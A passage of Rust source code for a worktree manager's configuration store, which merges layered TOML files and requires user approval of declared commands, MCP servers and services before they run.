//! The `ConfigStore` implementation.
//!
//! # Load order
//!
//! 1. Resolve the layer paths — the local one keyed on `git rev-parse
//!    --git-common-dir`, so every worktree of a repo shares it.
//! 2. Read what exists; a missing layer is normal, not an error.
//! 3. **Trust check.** Before anything is interpreted, hash the on-disk layers and
//!    refuse if they declare commands that have not been approved *at these exact
//!    bytes*.
//! 4. Merge weakest-to-strongest on `toml::Value`, then deserialize once.
//! 5. Validate semantically, so a bad template is an error here rather than a strange
//!    worktree later.
//!
//! Step 3 comes before step 4 for a reason: the trust prompt has to show the user what
//! *the file* says, and a merged view would attribute a command to the wrong file.
//!
//! # Caching
//!
//! Resolved projects are cached against the layer files' content hashes, so an edit
//! invalidates the cache automatically. Without it, listing worktrees would re-read,
//! re-merge and re-validate on every refresh.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};

use parking_lot::Mutex;
use serde::Serialize;
use toml::Value;
use wtm_core::error::{ConfigError, ConfigLayer, DatabaseTrustDeclaration};
use wtm_core::model::{Project, ProjectId};
use wtm_core::ports::clock::Clock;
use wtm_core::ports::config::{ConfigStore, LayerProvenance, TrustDecision};
use wtm_core::ports::git::Git;
use wtm_core::ports::template::TemplateEngine;

use crate::layers::{self, LayerPaths, LoadedLayer};
use crate::paths::AppPaths;
use crate::sidebar::SidebarLayout;
use crate::trust::{self, TrustStore};
use crate::user::UserConfig;
use crate::validate::{self, Origin};
use crate::workflow_file::{self, EditError, WorkflowDraft, WorkflowHome};

/// A resolved project plus the hashes it was resolved from.
#[derive(Debug, Clone)]
struct CacheEntry {
    project: Project,
    /// `(path, hash)` for every on-disk layer that contributed.
    fingerprint: Vec<(PathBuf, String)>,
}

/// A short-lived execution approval cannot outlive a config or trust decision.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecutionRevision {
    layers: Vec<(PathBuf, String)>,
    trust: String,
    decision: u64,
}

/// Filesystem-backed [`ConfigStore`].
pub struct FileConfigStore {
    paths: AppPaths,
    git: Arc<dyn Git>,
    engine: Arc<dyn TemplateEngine>,
    clock: Arc<dyn Clock>,
    cache: Mutex<BTreeMap<PathBuf, CacheEntry>>,
    /// Serializes read-modify-write of `config.toml`. Two overlapping `set_sidebar_layout`
    /// or `register_project` calls would otherwise each load, mutate, and save, and
    /// the second write would drop the first.
    user_write: Mutex<()>,
    trust_revision: AtomicU64,
}

impl std::fmt::Debug for FileConfigStore {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("FileConfigStore")
            .field("paths", &self.paths)
            .finish_non_exhaustive()
    }
}

impl FileConfigStore {
    #[must_use]
    pub fn new(
        paths: AppPaths,
        git: Arc<dyn Git>,
        engine: Arc<dyn TemplateEngine>,
        clock: Arc<dyn Clock>,
    ) -> Self {
        Self {
            paths,
            git,
            engine,
            clock,
            cache: Mutex::new(BTreeMap::new()),
            user_write: Mutex::new(()),
            trust_revision: AtomicU64::new(0),
        }
    }

    #[must_use]
    pub fn paths(&self) -> &AppPaths {
        &self.paths
    }

    /// Read the user config, treating absence as defaults.
    pub fn user_config(&self) -> Result<UserConfig, ConfigError> {
        UserConfig::load(&self.paths.config_file)
    }

    fn save_user_config(&self, config: &UserConfig) -> Result<(), ConfigError> {
        self.paths.ensure_dir()?;
        config.save(&self.paths.config_file)
    }

    /// How the sidebar arranges `repo_root`'s worktrees.
    ///
    /// Deliberately an inherent method rather than part of the [`ConfigStore`] port. A
    /// sidebar layout is a UI preference: no use-case reads it, no plan depends on it, and
    /// putting it on the port would hand the domain an opinion about the UI. The
    /// composition root reaches for the concrete store, which is the one place allowed to.
    pub fn sidebar_layout(&self, repo_root: &Path) -> Result<SidebarLayout, ConfigError> {
        Ok(self.user_config()?.sidebar(repo_root))
    }

    /// Replace the sidebar layout for `repo_root`, returning it normalized.
    ///
    /// The whole layout rather than one edit at a time: every edit the sidebar makes — a drag,
    /// a rename, a fold — is applied optimistically in the frontend, so what arrives here is
    /// already the state the user is looking at, and [`SidebarLayout::normalized`] is what
    /// makes it safe to take verbatim. Writing the whole config back for it is fine: the file
    /// is small, the write is atomic, and these are deliberate clicks rather than a loop.
    pub fn set_sidebar_layout(
        &self,
        repo_root: &Path,
        layout: &SidebarLayout,
    ) -> Result<SidebarLayout, ConfigError> {
        let _write = self.user_write.lock();
        let mut config = self.user_config()?;
        let key = repo_root.to_string_lossy();
        let stored_form = |config: &UserConfig| {
            config
                .projects
                .get(key.as_ref())
                .map(|entry| (entry.sidebar.clone(), entry.favorites.clone()))
        };
        let before = stored_form(&config);
        let Some(stored) = config.set_sidebar(repo_root, layout) else {
            tracing::warn!(
                repo = %repo_root.display(),
                "ignoring a sidebar layout for an unregistered project"
            );
            return Ok(layout.normalized());
        };
        // What would be written is what is already there — a fold of an already-folded group,
        // say — so no write.
        if stored_form(&config) == before {
            return Ok(stored);
        }
        self.save_user_config(&config)?;
        Ok(stored)
    }

    /// Take one worktree out of `repo_root`'s layout, for when the worktree itself is removed.
    pub fn forget_worktree_in_sidebar(
        &self,
        repo_root: &Path,
        worktree: &str,
    ) -> Result<(), ConfigError> {
        let _write = self.user_write.lock();
        let mut config = self.user_config()?;
        if !config.forget_in_sidebar(repo_root, worktree) {
            return Ok(());
        }
        self.save_user_config(&config)
    }

    fn trust_store(&self) -> TrustStore {
        TrustStore::load(&self.paths.trust_file)
    }

    /// Resolve the paths of all four layers for `repo_root`.
    fn layer_paths(&self, repo_root: &Path) -> Result<LayerPaths, ConfigError> {
        // `--git-common-dir`, never `--git-dir`. See the module docs in `layers`.
        let common = self
            .git
            .git_common_dir(repo_root)
            .map_err(|e| ConfigError::Io {
                path: repo_root.to_path_buf(),
                message: format!("cannot resolve the git directory: {e}"),
            })?;
        Ok(LayerPaths::new(repo_root, &common, &self.paths.config_file))
    }

    /// Read every layer that exists, weakest first.
    fn read_layers(&self, repo_root: &Path) -> Result<Vec<LoadedLayer>, ConfigError> {
        self.read_layers_as(repo_root, None)
    }

    /// [`Self::read_layers`], with `replaced`'s file read as the text beside it instead of what is
    /// on disk: what loading would see if that text were written, before anything is.
    fn read_layers_as(
        &self,
        repo_root: &Path,
        replaced: Option<(&Path, &str)>,
    ) -> Result<Vec<LoadedLayer>, ConfigError> {
        let read_optional = |path: &Path| match replaced {
            Some((at, text)) if at == path => Ok(Some(text.to_owned())),
            _ => read_optional(path),
        };
        let paths = self.layer_paths(repo_root)?;
        let mut out = Vec::with_capacity(4);

        out.push(LoadedLayer {
            layer: ConfigLayer::BuiltIn,
            path: None,
            value: layers::parse(
                Path::new("<built-in>"),
                ConfigLayer::BuiltIn,
                layers::BUILT_IN_DEFAULTS,
            )?,
            source: None,
        });

        // The user layer is an app config; only its project-relevant parts apply.
        if let Some(source) = read_optional(&paths.user)? {
            let user = layers::parse(&paths.user, ConfigLayer::User, &source)?;
            out.push(LoadedLayer {
                layer: ConfigLayer::User,
                path: Some(paths.user.clone()),
                value: layers::project_overrides_from_user(&user, repo_root),
                source: Some(source),
            });
        }

        for (layer, path) in [
            (ConfigLayer::Repo, &paths.repo),
            (ConfigLayer::Local, &paths.local),
        ] {
            if let Some(source) = read_optional(path)? {
                out.push(LoadedLayer {
                    layer,
                    path: Some(path.clone()),
                    value: layers::parse(path, layer, &source)?,
                    source: Some(source),
                });
            }
        }

        Ok(out)
    }

    /// Refuse to interpret a layer whose declared commands are not approved.
    ///
    /// Checked per *file*, before merging, so the prompt can attribute each command to
    /// the file that actually declares it.
    fn enforce_trust(&self, loaded: &[LoadedLayer]) -> Result<(), ConfigError> {
        let store = self.trust_store();

        for layer in loaded {
            // The user's own config is not a trust boundary: it is theirs, it lives
            // outside any repository, and prompting for it would train people to click
            // through the prompt that does matter.
            if layer.layer == ConfigLayer::User || layer.layer == ConfigLayer::BuiltIn {
                continue;
            }
            let (Some(path), Some(source)) = (&layer.path, &layer.source) else {
                continue;
            };

            let declared = declared_commands_in(&layer.value);
            let databases = declared_databases_in(&layer.value);
            if declared.is_empty() && databases.is_empty() {
                // Nothing to execute or connect to, so nothing to approve.
                continue;
            }
            if store.is_approved(path, source) {
                continue;
            }

            return Err(ConfigError::Untrusted {
                path: path.clone(),
                commands: declared,
                databases,
                content_hash: trust::content_hash(source),
            });
        }

        Ok(())
    }

    /// Everything `load` does after the trust check: refuse what a repository may not declare,
    /// merge, deserialize and validate.
    fn resolve(&self, repo_root: &Path, loaded: &[LoadedLayer]) -> Result<Project, ConfigError> {
        refuse_repository_roles(loaded)?;

        // Report errors against the most specific file that contributed, since that is
        // the one most likely to hold the mistake.
        let origin = most_specific(loaded, |_| true);
        // Except for `[workflow]`, whose mistakes are in the file that declares it. That is seldom
        // the most specific one, because a repository's `wtm.toml` may not declare roles at all.
        let workflow_origin = most_specific(loaded, |value| value.get("workflow").is_some());
        // And `[environment]`, which a repository usually declares and your own config seldom does.
        let environment_origin = most_specific(loaded, |value| value.get("environment").is_some());

        self.finish(
            repo_root,
            layers::merge_all(loaded),
            &origin,
            &workflow_origin,
            &environment_origin,
        )
    }

    /// Deserialize and validate a merged value.
    fn finish(
        &self,
        repo_root: &Path,
        merged: Value,
        origin: &Origin,
        workflow_origin: &Origin,
        environment_origin: &Origin,
    ) -> Result<Project, ConfigError> {
        let mut project: Project = merged.try_into().map_err(|e: toml::de::Error| {
            let span = e.span();
            ConfigError::Invalid {
                path: origin.path.clone(),
                layer: origin.layer,
                line: span.map(|_| 0),
                column: None,
                key: None,
                message: e.message().to_owned(),
            }
        })?;

        project.id = ProjectId::from_root(repo_root);
        project.root = repo_root.to_path_buf();

        // First, against its own file. `validate` checks it again for callers with only one
        // origin to offer, and finds nothing new.
        validate::check_workflow(&project, workflow_origin)?;
        validate::check_environment(&project, self.engine.as_ref(), environment_origin)?;
        validate::validate(&project, self.engine.as_ref(), origin)?;
        Ok(project)
    }

    /// `(path, hash)` for each on-disk layer, used as the cache key.
    fn fingerprint(loaded: &[LoadedLayer]) -> Vec<(PathBuf, String)> {
        loaded
            .iter()
            .filter_map(|l| {
                let path = l.path.clone()?;
                let source = l.source.as_ref()?;
                Some((path, trust::content_hash(source)))
            })
            .collect()
    }

    /// Recheck trust rather than borrowing `load`'s cached project. The opaque
    /// value is only for in-memory approvals, never a durable authorization.
    pub fn execution_revision(&self, repo_root: &Path) -> Result<ExecutionRevision, ConfigError> {
        let loaded = self.read_layers(repo_root)?;
        self.enforce_trust(&loaded)?;
        let trust = read_optional(&self.paths.trust_file)?.unwrap_or_default();
        Ok(ExecutionRevision {
            layers: Self::fingerprint(&loaded),
            trust: trust::content_hash(&trust),
            decision: self.trust_revision.load(Ordering::Acquire),
        })
    }
}

/// Where a project's recipes and roles are written, and what a save has to bring back to be taken.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct WorkflowFile {
    /// Where an edit is written: the most specific home that declares recipes or roles, else the
    /// most specific that declares `[workflow]`. `None` when nothing does, and the editor asks.
    pub home: Option<WorkflowHome>,
    /// Every home that declares recipes or roles, weakest first.
    pub declaring: Vec<WorkflowHome>,
    /// The homes that declare each role, weakest first: a role your defaults declare cannot be
    /// deleted from a project's entry, and the editor says so before you try.
    pub role_homes: BTreeMap<String, Vec<WorkflowHome>>,
    /// The same for each recipe.
    pub recipe_homes: BTreeMap<String, Vec<WorkflowHome>>,
    /// `~/.config/wtm/config.toml`, which holds the defaults and the project homes.
    pub user_path: PathBuf,
    /// `<git-common-dir>/wtm.local.toml`.
    pub local_path: PathBuf,
    /// The project's key under `[projects]`: its root, as registered.
    pub root_key: String,
    /// A hash over both files as they were read. A save made from an older reading is refused, so
    /// an edit made by hand meanwhile is not overwritten by a screen that never showed it.
    pub revision: String,
}

impl WorkflowFile {
    /// The file `home` lives in.
    #[must_use]
    pub fn path_of(&self, home: WorkflowHome) -> &Path {
        match home {
            WorkflowHome::Defaults | WorkflowHome::Project => &self.user_path,
            WorkflowHome::Local => &self.local_path,
        }
    }
}

/// Why recipes and roles were not saved.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error, Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum WorkflowSaveError {
    #[error("the config changed on disk since Settings read it; reload to see it, then edit again")]
    Stale,
    #[error("no file declares this project's workflow yet; choose where to keep it")]
    NoHome,
    /// Serialized as the edit error itself, by the caller: nested, both would carry a `kind`, and
    /// the inner one would silently win.
    #[error(transparent)]
    #[serde(skip_serializing)]
    Edit(#[from] EditError),
    /// What validation refused, with the key it is about, relative to `workflow` when it is in it.
    #[error("{message}")]
    Invalid {
        key: Option<String>,
        message: String,
    },
    /// The local layer declares commands you have not approved, so nothing writes to it until you
    /// decide on them in the trust prompt.
    #[error(
        "{} declares commands you have not approved; approve or reject them first",
        path.display()
    )]
    Untrusted { path: PathBuf },
    #[error("{message}")]
    Config { message: String },
}

impl From<ConfigError> for WorkflowSaveError {
    fn from(error: ConfigError) -> Self {
        match error {
            ConfigError::Invalid { key, message, .. } => Self::Invalid {
                key: key.map(|key| {
                    key.strip_prefix("workflow.")
                        .map_or_else(|| key.clone(), str::to_owned)
                }),
                message,
            },
            other => Self::Config {
                message: other.to_string(),
            },
        }
    }
}

/// The text of each file a workflow edit reads, as found.
struct WorkflowTexts {
    file: WorkflowFile,
    user: Option<String>,
    local: Option<String>,
    repo: Option<String>,
}

impl FileConfigStore {
    /// Where `repo_root`'s recipes and roles live, for Settings › Recipes.
    ///
    /// # Errors
    ///
    /// When a file cannot be read or is not TOML.
    pub fn workflow_file(&self, repo_root: &Path) -> Result<WorkflowFile, ConfigError> {
        Ok(self.workflow_texts(repo_root)?.file)
    }

    /// Whether `draft`, written where it would be, would load: the edit made in memory, then the
    /// project resolved from every layer exactly as loading does, `WorkflowSpec::validate` included.
    ///
    /// # Errors
    ///
    /// The first problem, with its key when it has one.
    pub fn check_workflow(
        &self,
        repo_root: &Path,
        draft: &WorkflowDraft,
        home: Option<WorkflowHome>,
    ) -> Result<(), WorkflowSaveError> {
        let texts = self.workflow_texts(repo_root)?;
        self.edited(repo_root, &texts, draft, home).map(|_| ())
    }

    /// Write `draft` to the file that declares the workflow, keeping everything else in it.
    ///
    /// # Trust
    ///
    /// Your own config is not a trust boundary. The local layer is, when it declares commands: its
    /// approval is bound to its bytes, and this write changes them. An edit made here changes only
    /// recipes and roles, which run nothing (`collect_runs` and its siblings find nothing new in
    /// them, and that is checked rather than assumed), so the approval you gave the file is carried
    /// to the bytes written, and only when you had given it: a file you never approved is refused
    /// rather than written. Anything else that changes the file, an editor or a `git` checkout,
    /// changes its hash and brings the prompt back, as before.
    ///
    /// # Errors
    ///
    /// `Stale` when either file changed since `revision` was read; the edit's own refusals; what
    /// validation refuses; `Untrusted` as above.
    pub fn save_workflow(
        &self,
        repo_root: &Path,
        draft: &WorkflowDraft,
        revision: &str,
        home: Option<WorkflowHome>,
    ) -> Result<WorkflowFile, WorkflowSaveError> {
        // The user config is also rewritten by preferences and the sidebar: one writer at a time,
        // from the read to the rename, or one of the two would drop the other's change.
        let _write = self.user_write.lock();
        let texts = self.workflow_texts(repo_root)?;
        if texts.file.revision != revision {
            return Err(WorkflowSaveError::Stale);
        }
        let (home, text) = self.edited(repo_root, &texts, draft, home)?;
        let path = texts.file.path_of(home).to_path_buf();
        let before = match home {
            WorkflowHome::Local => texts.local.clone(),
            WorkflowHome::Defaults | WorkflowHome::Project => texts.user.clone(),
        };

        let approve = if home == WorkflowHome::Local {
            self.carried_approval(&path, before.as_deref().unwrap_or_default(), &text)?
        } else {
            false
        };

        let io = |e: &std::io::Error| ConfigError::Io {
            path: path.clone(),
            message: e.to_string(),
        };
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| io(&e))?;
        }
        let temporary = crate::fs::unique_temp_path(&path);
        std::fs::write(&temporary, &text).map_err(|e| io(&e))?;
        std::fs::rename(&temporary, &path).map_err(|e| io(&e))?;

        if approve {
            let mut store = self.trust_store();
            store.record(
                &path,
                &text,
                TrustDecision::Approve,
                Some(self.clock.now_iso()),
            );
            self.paths.ensure_dir()?;
            store.save(&self.paths.trust_file)?;
            self.trust_revision.fetch_add(1, Ordering::AcqRel);
        }
        self.cache.lock().clear();
        Ok(self.workflow_file(repo_root)?)
    }

    /// Whether the local layer's approval goes with this write: `Ok(true)` when it declares
    /// something to approve and you had approved it, `Ok(false)` when it declares nothing.
    fn carried_approval(
        &self,
        path: &Path,
        before: &str,
        after: &str,
    ) -> Result<bool, WorkflowSaveError> {
        let declared = |text: &str| {
            layers::document(text)
                .map(|value| (declared_commands_in(&value), declared_databases_in(&value)))
        };
        let unreadable = |e: toml::de::Error| WorkflowSaveError::Config {
            message: format!("{}: {}", path.display(), e.message()),
        };
        let was = declared(before).map_err(unreadable)?;
        let now = declared(after).map_err(unreadable)?;
        if now != was {
            // Not reachable from a recipe edit, which is the point of checking: the carried
            // approval is only honest while the commands it covers are the ones you saw.
            return Err(WorkflowSaveError::Config {
                message: format!(
                    "{}: saving recipes would change the commands this file declares, so it was \
                     not written",
                    path.display()
                ),
            });
        }
        if was.0.is_empty() && was.1.is_empty() {
            return Ok(false);
        }
        if !self.trust_store().is_approved(path, before) {
            return Err(WorkflowSaveError::Untrusted {
                path: path.to_path_buf(),
            });
        }
        Ok(true)
    }

    /// The edited file's text, and the home it goes to, once the project it makes has resolved.
    fn edited(
        &self,
        repo_root: &Path,
        texts: &WorkflowTexts,
        draft: &WorkflowDraft,
        asked: Option<WorkflowHome>,
    ) -> Result<(WorkflowHome, String), WorkflowSaveError> {
        let file = &texts.file;
        let home = match (file.home, asked) {
            (Some(home), None) => home,
            (Some(home), Some(asked)) if home == asked => home,
            // A screen that offered a choice when there was none to make is out of date.
            (Some(_), Some(_)) => return Err(WorkflowSaveError::Stale),
            (None, Some(asked)) => asked,
            (None, None) => return Err(WorkflowSaveError::NoHome),
        };

        let parse = |path: &Path, text: &Option<String>| -> Result<Value, WorkflowSaveError> {
            layers::document(text.as_deref().unwrap_or_default()).map_err(|e| {
                WorkflowSaveError::Config {
                    message: format!("{}: {}", path.display(), e.message()),
                }
            })
        };
        let user = parse(&file.user_path, &texts.user)?;
        let local = parse(&file.local_path, &texts.local)?;
        let repo = parse(&repo_root.join(layers::REPO_FILENAME), &texts.repo)?;
        let sections = homes(&user, &local, &file.root_key);

        // What the layers beneath the home give, and where that comes from.
        let mut base: Option<Value> = None;
        let mut from = Vec::new();
        for (beneath, workflow) in sections.iter().filter(|(h, _)| *h < home) {
            if let Some(workflow) = workflow {
                base = Some(match base {
                    Some(base) => layers::merge(base, (*workflow).clone()),
                    None => (*workflow).clone(),
                });
                from.push(format!(
                    "{} in {}",
                    beneath.header(&file.root_key),
                    file.path_of(*beneath).display()
                ));
            }
        }
        // The repository sits between your project entry and the local layer. It cannot declare
        // roles or recipes, but its workflow is still part of what the local layer merges onto.
        if home == WorkflowHome::Local
            && let Some(workflow) = repo.get("workflow")
        {
            base = Some(match base {
                Some(base) => layers::merge(base, workflow.clone()),
                None => workflow.clone(),
            });
        }

        let path = file.path_of(home);
        let before = match home {
            WorkflowHome::Local => &texts.local,
            WorkflowHome::Defaults | WorkflowHome::Project => &texts.user,
        };
        let text = workflow_file::edit(
            before.as_deref().unwrap_or_default(),
            &home.section(&file.root_key),
            base.as_ref(),
            &from.join(" and "),
            draft,
        )?;

        let loaded = self.read_layers_as(repo_root, Some((path, &text)))?;
        let project = self.resolve(repo_root, &loaded)?;
        let workflow = project.workflow.unwrap_or_default();
        if workflow.role != draft.role || workflow.recipe != draft.recipe {
            return Err(WorkflowSaveError::Config {
                message: format!(
                    "{}: the edit did not load back as the recipes shown, so it was not written",
                    path.display()
                ),
            });
        }
        if home == WorkflowHome::Defaults {
            self.others_still_load(repo_root, path, &text)?;
        }
        Ok((home, text))
    }

    /// Your defaults are every project's, so an edit made to them from one project's Settings must
    /// leave every other registered project loading that loaded before: a role deleted here may be
    /// one another project's recipe names, or one it overrides a key of.
    fn others_still_load(
        &self,
        repo_root: &Path,
        user_path: &Path,
        text: &str,
    ) -> Result<(), WorkflowSaveError> {
        for root in self.user_config()?.project_roots() {
            if root == repo_root {
                continue;
            }
            // A project that no longer resolves, or did not load already, is not this edit's doing.
            let Ok(before) = self.read_layers(&root) else {
                continue;
            };
            if self.resolve(&root, &before).is_err() {
                continue;
            }
            let Ok(after) = self.read_layers_as(&root, Some((user_path, text))) else {
                continue;
            };
            if let Err(error) = self.resolve(&root, &after) {
                return Err(WorkflowSaveError::Config {
                    message: format!(
                        "this changes your defaults, which every project reads, and {} would no \
                         longer load: {error}",
                        root.display()
                    ),
                });
            }
        }
        Ok(())
    }

    fn workflow_texts(&self, repo_root: &Path) -> Result<WorkflowTexts, ConfigError> {
        let paths = self.layer_paths(repo_root)?;
        let user = read_optional(&paths.user)?;
        let local = read_optional(&paths.local)?;
        let repo = read_optional(&paths.repo)?;
        let root_key = repo_root.to_string_lossy().into_owned();

        let user_value = layers::parse(
            &paths.user,
            ConfigLayer::User,
            user.as_deref().unwrap_or_default(),
        )?;
        let local_value = layers::parse(
            &paths.local,
            ConfigLayer::Local,
            local.as_deref().unwrap_or_default(),
        )?;
        let sections = homes(&user_value, &local_value, &root_key);
        let declaring: Vec<WorkflowHome> = sections
            .iter()
            .filter(|(_, w)| w.is_some_and(workflow_file::declares_recipes))
            .map(|(home, _)| *home)
            .collect();
        let mut role_homes: BTreeMap<String, Vec<WorkflowHome>> = BTreeMap::new();
        let mut recipe_homes: BTreeMap<String, Vec<WorkflowHome>> = BTreeMap::new();
        for (home, workflow) in &sections {
            for (map, into) in [("role", &mut role_homes), ("recipe", &mut recipe_homes)] {
                let ids = workflow
                    .and_then(|w| w.get(map))
                    .and_then(Value::as_table)
                    .into_iter()
                    .flat_map(|table| table.keys());
                for id in ids {
                    into.entry(id.clone()).or_default().push(*home);
                }
            }
        }
        let home = declaring.last().copied().or_else(|| {
            sections
                .iter()
                .rev()
                .find(|(_, w)| w.is_some())
                .map(|(home, _)| *home)
        });
        // The root too: two projects with no local layer read the same files, and a reading of one
        // must not pass for a reading of the other.
        let revision = trust::content_hash(&format!(
            "{root_key}\u{0}{}\u{0}{}",
            user.as_deref().map_or("-", |t| t),
            local.as_deref().map_or("-", |t| t)
        ));
        Ok(WorkflowTexts {
            file: WorkflowFile {
                home,
                declaring,
                role_homes,
                recipe_homes,
                user_path: paths.user,
                local_path: paths.local,
                root_key,
                revision,
            },
            user,
            local,
            repo,
        })
    }
}

/// Each home's raw `workflow` table, weakest first.
fn homes<'a>(
    user: &'a Value,
    local: &'a Value,
    root_key: &str,
) -> [(WorkflowHome, Option<&'a Value>); 3] {
    let at = |value: &'a Value, path: Vec<String>| {
        path.iter()
            .try_fold(value, |value, key| value.get(key.as_str()))
    };
    [
        (
            WorkflowHome::Defaults,
            at(user, WorkflowHome::Defaults.section(root_key)),
        ),
        (
            WorkflowHome::Project,
            at(user, WorkflowHome::Project.section(root_key)),
        ),
        (
            WorkflowHome::Local,
            at(local, WorkflowHome::Local.section(root_key)),
        ),
    ]
}

/// The most specific on-disk layer whose value satisfies `declares`, or the built-in layer.
fn most_specific(loaded: &[LoadedLayer], declares: impl Fn(&Value) -> bool) -> Origin {
    loaded
        .iter()
        .rev()
        .filter(|layer| declares(&layer.value))
        .find_map(|layer| {
            layer.path.clone().map(|path| Origin {
                path,
                layer: layer.layer,
            })
        })
        .unwrap_or_else(|| Origin {
            path: PathBuf::from("<built-in>"),
            layer: ConfigLayer::BuiltIn,
        })
}

/// Refuse recipes, roles, checks and a forge declared in a repository's `wtm.toml`.
///
/// A role chooses which of your MCP servers and plugins a run session may load and which provider
/// account it spends, so it is authority, and a committed file is written by whoever can push to the
/// branch. The trust prompt is the wrong tool here: it shows commands to approve, and a role is not
/// a command, so approving one would be a click on something the prompt never showed. Your own
/// config and the untracked local layer are yours, so both may declare them.
///
/// `planner` names one of those roles and has it run by itself once a started issue's worktree is
/// ready, `designer` one that runs by itself once you approve a plan that asks for a design, and
/// `implement` the writer that edits the worktree once you approve a plan, so all three are refused
/// with them.
///
/// `forge` and `tracker` are refused for the same reason in different words: naming one is the
/// opt-in that lets the Work view call that service through your own CLI and credentials
/// (ARCHITECTURE §6a), and that consent is not the repository's to give. The tracker's status
/// mapping, fields and queue query are allowed: they are read only once you have named a tracker,
/// and none of them can write anything.
fn refuse_repository_roles(loaded: &[LoadedLayer]) -> Result<(), ConfigError> {
    for layer in loaded
        .iter()
        .filter(|layer| layer.layer == ConfigLayer::Repo)
    {
        let Some(workflow) = layer.value.get("workflow") else {
            continue;
        };
        let refuse = |key: &str, message: &str| ConfigError::Invalid {
            path: layer.path.clone().unwrap_or_default(),
            layer: ConfigLayer::Repo,
            line: None,
            column: None,
            key: Some(format!("workflow.{key}")),
            message: message.to_owned(),
        };
        for table in ["role", "recipe", "planner", "designer", "implement"] {
            if workflow.get(table).is_some() {
                return Err(refuse(
                    table,
                    "recipes and roles belong in your own config \
                     (~/.config/wtm/config.toml), not in a repository's wtm.toml: a role \
                     decides which of your MCP servers, plugins and accounts a run uses",
                ));
            }
        }
        if workflow.get("forge").is_some() {
            return Err(refuse(
                "forge",
                "the forge belongs in your own config (~/.config/wtm/config.toml), not in a \
                 repository's wtm.toml: naming it lets wtm use your gh sign-in for this \
                 project, and that is your decision",
            ));
        }
        if workflow.get("tracker").is_some() {
            return Err(refuse(
                "tracker",
                "the tracker belongs in your own config (~/.config/wtm/config.toml), not in a \
                 repository's wtm.toml: naming it lets wtm use your acli sign-in for this \
                 project, and that is your decision",
            ));
        }
        if workflow.get("check").is_some() {
            return Err(refuse(
                "check",
                "review checks belong in your own config (~/.config/wtm/config.toml), not in a \
                 repository's wtm.toml: a check is a command wtm runs outside every sandbox when \
                 a review role asks",
            ));
        }
        if workflow.get("start_services").is_some() {
            return Err(refuse(
                "start_services",
                "whether a review may start services by itself belongs in your own config \
                 (~/.config/wtm/config.toml), not in a repository's wtm.toml: `auto` lets a \
                 model's request start processes on this machine",
            ));
        }
    }
    Ok(())
}

fn read_optional(path: &Path) -> Result<Option<String>, ConfigError> {
    match std::fs::read_to_string(path) {
        Ok(text) => Ok(Some(text)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(ConfigError::Io {
            path: path.to_path_buf(),
            message: e.to_string(),
        }),
    }
}

/// Every argv a raw config value would run.
///
/// Deliberately operates on `toml::Value` rather than a deserialized `Project`: the
/// trust prompt has to work even when the config does not fully validate, because an
/// invalid config can still contain a `run` array, and refusing to show it would be
/// exactly backwards.
fn declared_commands_in(value: &Value) -> Vec<Vec<String>> {
    let mut out: Vec<Vec<String>> = Vec::new();
    collect_runs(value, &mut out);
    collect_agent_processes(value, &mut out);
    collect_environment_processes(value, &mut out);
    out
}

/// What `[[environment.service]]` would run: `start`, `stop`, `logs`, and a health `command`.
///
/// Its own walk for the reason `collect_agent_processes` has one: none of the four is spelled
/// `run`, so a `wtm.toml` declaring nothing but a service would otherwise load without a prompt and
/// run its `start` the first time someone pressed Start. `[[environment.command]]` is spelled `run`
/// on purpose and needs nothing here. A health `url` and a `preview` are not listed: wtm fetches
/// and opens only addresses on this machine (`wtm_core::flow::env::loopback_url`), which starts no
/// process and reaches no network.
fn collect_environment_processes(value: &Value, out: &mut Vec<Vec<String>>) {
    let Some(services) = value
        .get("environment")
        .and_then(|environment| environment.get("service"))
        .and_then(Value::as_array)
    else {
        return;
    };
    for service in services.iter().filter_map(Value::as_table) {
        for key in ["start", "stop", "logs"] {
            if let Some(argv) = service.get(key) {
                push_argv(out, argv_words(argv));
            }
        }
        if let Some(command) = service
            .get("health")
            .and_then(|health| health.get("command"))
        {
            push_argv(out, argv_words(command));
        }
    }
}

/// What the `[agent.<id>]` tables would put on a process wtm starts.
///
/// Its own walk because neither is spelled `run`, which is how both got past this gate before:
/// an MCP server is `command` plus `args`, and `extra_args` lengthen an argv this file does not
/// name. Both run when a session opens, so a layer declaring nothing else still needs approving.
///
/// The CLI that receives `extra_args` comes from the compiled catalogue, so the prompt shows the
/// agent's id and an ellipsis where the catalogue's own arguments go, rather than an argv nobody
/// would run. `[agent.<id>.env]` goes in front of that, `KEY=value` the way a shell would write it,
/// because an environment is as much a way to run code as an argument is: `NODE_OPTIONS` loads a
/// script into a Node CLI, and `ANTHROPIC_BASE_URL` decides which server reads the worktree. The
/// rest of `[agent.<id>]` (model, effort, mode) names no process, and stays outside the prompt.
fn collect_agent_processes(value: &Value, out: &mut Vec<Vec<String>>) {
    let Some(agents) = value.get("agent").and_then(Value::as_table) else {
        return;
    };
    for (id, agent) in agents {
        let Some(agent) = agent.as_table() else {
            continue;
        };
        if let Some(servers) = agent.get("mcp").and_then(Value::as_table) {
            for server in servers.values().filter_map(Value::as_table) {
                let mut argv: Vec<String> =
                    server.get("command").map(argv_word).into_iter().collect();
                argv.extend(server.get("args").map(argv_words).unwrap_or_default());
                push_argv(out, argv);
            }
        }
        let env: Vec<String> = match agent.get("env") {
            Some(Value::Table(vars)) => vars
                .iter()
                .map(|(name, value)| format!("{name}={}", argv_word(value)))
                .collect(),
            other => other.map(argv_words).unwrap_or_default(),
        };
        let extra = agent.get("extra_args").map(argv_words).unwrap_or_default();
        if !env.is_empty() || !extra.is_empty() {
            push_argv(
                out,
                env.into_iter()
                    .chain([id.clone(), "…".to_owned()])
                    .chain(extra)
                    .collect(),
            );
        }
    }
}

/// One argv word from a raw value. A non-string is shown as written rather than dropped, because
/// the prompt has to disclose a malformed config too.
fn argv_word(value: &Value) -> String {
    value
        .as_str()
        .map_or_else(|| value.to_string(), str::to_owned)
}

/// The words of a raw argv: an array's items, or a lone value standing in for one.
